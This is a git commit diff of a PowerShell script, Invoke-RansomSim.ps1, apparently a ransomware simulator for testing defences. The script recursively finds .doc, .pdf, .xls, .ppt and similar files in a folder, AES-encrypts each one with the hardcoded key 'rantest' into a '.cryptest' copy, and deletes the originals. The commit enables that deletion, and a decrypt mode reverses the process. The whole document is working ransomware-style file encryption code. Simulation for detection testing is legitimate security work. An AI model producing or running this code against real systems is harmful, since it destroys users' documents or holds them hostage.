b5b37ce57ca0bf2e22ae53c23ad3798728eccc84
smgorelik <smgorelik@gmail.com>
2022-05-11 00:09:47 -0400

    Update Invoke-RansomSim.ps1

--- Invoke-RansomSim.ps1
+++ Invoke-RansomSim.ps1
@@ -2,122 +2,148 @@
 Invoke-AESEncryption was copied from https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
 introduced small modifications
 #>
-function Invoke-AESEncryption {
-    [CmdletBinding()]
-    [OutputType([string])]
-    Param
-    (
+
+
+Invoke-RansomSim 
+{
+<#
+.SYNOPSIS
+#>
+[CmdletBinding()]
+Param(
         [Parameter(Mandatory = $true)]
         [ValidateSet('Encrypt', 'Decrypt')]
         [String]$Mode,
 
         [Parameter(Mandatory = $true)]
-        [String]$Key,
+        [String]$folderPath
+)
 
-        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
-        [String]$Text,
+    function Invoke-AESEncryption {
+        [CmdletBinding()]
+        [OutputType([string])]
+        Param
+        (
+            [Parameter(Mandatory = $true)]
+            [ValidateSet('Encrypt', 'Decrypt')]
+            [String]$Mode,
 
-        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
-        [String]$Path
-    )
+            [Parameter(Mandatory = $true)]
+            [String]$Key,
 
-    Begin {
-        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
-        $aesManaged = New-Object System.Security.Cryptography.AesManaged
-        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-        $aesManaged.BlockSize = 128
-        $aesManaged.KeySize = 256
-    }
+            [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+            [String]$Text,
 
-    Process {
-        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+            [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+            [String]$Path
+        )
 
-        switch ($Mode) {
-            'Encrypt' {
-                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+        Begin {
+            $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+            $aesManaged = New-Object System.Security.Cryptography.AesManaged
+            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+            $aesManaged.BlockSize = 128
+            $aesManaged.KeySize = 256
+        }
+
+        Process {
+            $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+            switch ($Mode) {
+                'Encrypt' {
+                    if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                 
-                if ($Path) {
-                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
-                    if (!$File.FullName) {
-                        Write-Error -Message "File not found!"
-                        break
+                    if ($Path) {
+                        $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                        if (!$File.FullName) {
+                            Write-Error -Message "File not found!"
+                            break
+                        }
+                        $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                        $outPath = $File.FullName + ".cryptest"
                     }
-                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                    $outPath = $File.FullName + ".cryptest"
-                }
 
-                $encryptor = $aesManaged.CreateEncryptor()
-                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
-                $encryptedBytes = $aesManaged.IV + $encryptedBytes
-                $aesManaged.Dispose()
+                    $encryptor = $aesManaged.CreateEncryptor()
+                    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                    $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                    $aesManaged.Dispose()
 
-                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                    if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                 
-                if ($Path) {
-                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
-                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
-                    return "File encrypted to $outPath"
-                }
-            }
-
-            'Decrypt' {
-                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
-                
-                if ($Path) {
-                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
-                    if (!$File.FullName) {
-                        Write-Error -Message "File not found!"
-                        break
+                    if ($Path) {
+                        [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                        (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                        return "File encrypted to $outPath"
                     }
-                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
-                    $outPath = $File.FullName -replace ".cryptest"
                 }
 
-                $aesManaged.IV = $cipherBytes[0..15]
-                $decryptor = $aesManaged.CreateDecryptor()
-                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
-                $aesManaged.Dispose()
-
-                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                'Decrypt' {
+                    if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                 
-                if ($Path) {
-                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
-                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
-                    return "File decrypted to $outPath"
+                    if ($Path) {
+                        $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                        if (!$File.FullName) {
+                            Write-Error -Message "File not found!"
+                            break
+                        }
+                        $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                        $outPath = $File.FullName -replace ".cryptest"
+                    }
+
+                    $aesManaged.IV = $cipherBytes[0..15]
+                    $decryptor = $aesManaged.CreateDecryptor()
+                    $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                    $aesManaged.Dispose()
+
+                    if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                    if ($Path) {
+                        [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                        (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                        return "File decrypted to $outPath"
+                    }
                 }
             }
         }
+
+        End {
+            $shaManaged.Dispose()
+            $aesManaged.Dispose()
+        }
     }
 
-    End {
-        $shaManaged.Dispose()
-        $aesManaged.Dispose()
-    }
-}
-
-function fileList($SourceFolder, $extRegex)
-{
-    return gci $SourceFolder -Recurse -Attributes !Directory `
-    |  Where-Object{$_.Extension -match $extRegex} `
-    | %{$_.FullName}
-}
-
-function fileEncrypt($SourceFolder)
-{
-    Foreach($filepath in @(fileList $SourceFolder '\.(doc|pdf|docx|xls|xlsx|pptx|ppt)$'))
+    function fileList($SourceFolder, $extRegex)
     {
-        Invoke-AESEncryption -Mode Encrypt -Key "rantest" -Path $filepath
-        #Remove-Item $filepath
+        return gci $SourceFolder -Recurse -Attributes !Directory `
+        |  Where-Object{$_.Extension -match $extRegex} `
+        | %{$_.FullName}
     }
-}
 
-function fileDecrypt($SourceFolder)
-{
-    Foreach($filepath in @(fileList $SourceFolder '\.(cryptest)$'))
+    function fileEncrypt($SourceFolder)
     {
-        Invoke-AESEncryption -Mode Decrypt -Key "rantest" -Path $filepath
-        Remove-Item $filepath
+        Foreach($filepath in @(fileList $SourceFolder '\.(doc|pdf|docx|xls|xlsx|pptx|ppt)$'))
+        {
+            Invoke-AESEncryption -Mode Encrypt -Key "rantest" -Path $filepath
+            Remove-Item $filepath
+        }
     }
-}
 
+    function fileDecrypt($SourceFolder)
+    {
+        Foreach($filepath in @(fileList $SourceFolder '\.(cryptest)$'))
+        {
+            Invoke-AESEncryption -Mode Decrypt -Key "rantest" -Path $filepath
+            Remove-Item $filepath
+        }
+    }
+
+
+    if ($Mode.Equals('Encrypt')) 
+    {
+        fileEncrypt $folderPath
+    } else {
+        fileDecrypt $folderPath
+    }
+
+}
